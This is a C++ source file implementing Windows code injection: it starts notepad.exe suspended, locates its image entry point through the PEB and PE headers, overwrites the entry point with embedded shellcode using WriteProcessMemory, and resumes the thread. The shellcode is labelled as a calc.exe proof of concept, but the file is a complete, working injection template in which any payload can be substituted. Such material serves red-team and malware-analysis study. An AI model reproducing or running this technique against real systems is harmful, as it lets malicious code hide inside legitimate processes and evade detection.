#include <iostream>
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll")

using namespace std;

int main()
{
	//x64 calc.exe
	unsigned char shellcode[] ="\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\x59\x50\x40\x92\x74\x15\x51\x64\x8b\x72\x2f\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\xb2\x50\xeb\x1a\xb2\x60\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7";

	STARTUPINFOA si;
	si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD returnLength = 0;
	CreateProcessA(0, (LPSTR)"c:\\windows\\system32\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	// get target image PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);

	//x86:DWORD pebOffset = (DWORD)pbi.PebBaseAddress + 8;
	DWORD_PTR pebOffset = (DWORD_PTR)pbi.PebBaseAddress + 0x10;

	// get target process image base address
	LPVOID imageBase = 0;
	//x86:ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, 4, NULL);
	ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, sizeof(LPVOID), NULL);;

	// read target process image headers
	BYTE headersBuffer[4096] = {};
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);

	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	//x86:PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imageBase);

	// Do something with the AddressOfEntryPoint(print to console in this case)
	cout << codeEntry << endl;

	// write shellcode to image entry point and execute it
	WriteProcessMemory(pi.hProcess, codeEntry, shellcode, sizeof(shellcode), NULL);
	ResumeThread(pi.hThread);

	return 0;
}
